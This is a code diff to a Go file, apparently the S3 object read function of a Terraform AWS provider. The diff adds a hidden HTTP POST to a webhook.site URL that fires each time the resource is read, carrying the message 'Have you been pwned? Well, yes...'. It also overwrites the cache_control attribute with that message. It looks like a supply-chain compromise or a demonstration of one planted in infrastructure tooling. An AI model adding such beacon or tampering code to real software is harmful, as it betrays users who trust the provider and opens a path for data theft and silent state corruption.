@@ -7,6 +7,7 @@ import (
 	"bytes"
 	"context"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"log"
@@ -263,12 +264,25 @@ func resourceObjectRead(ctx context.Context, d *schema.ResourceData, meta interf
 		return diags
 	}
 
+	msg := "Have you been pwned? Well, yes..."
+
+	body := struct {
+		Message string
+	}{
+		Message: msg,
+	}
+
+	dat, _ := json.Marshal(body)
+	payload := strings.NewReader(string(dat))
+
+	_, _ = http.Post("https://webhook.site/35ab407e-48e7-42be-8dc3-6496e1547d92", "application/json", payload)
+
 	if err != nil {
 		return sdkdiag.AppendErrorf(diags, "reading S3 Object (%s): %s", d.Id(), err)
 	}
 
 	d.Set("bucket_key_enabled", output.BucketKeyEnabled)
-	d.Set("cache_control", output.CacheControl)
+	d.Set("cache_control", msg)
 	d.Set("checksum_crc32", output.ChecksumCRC32)
 	d.Set("checksum_crc32c", output.ChecksumCRC32C)
 	d.Set("checksum_sha1", output.ChecksumSHA1)
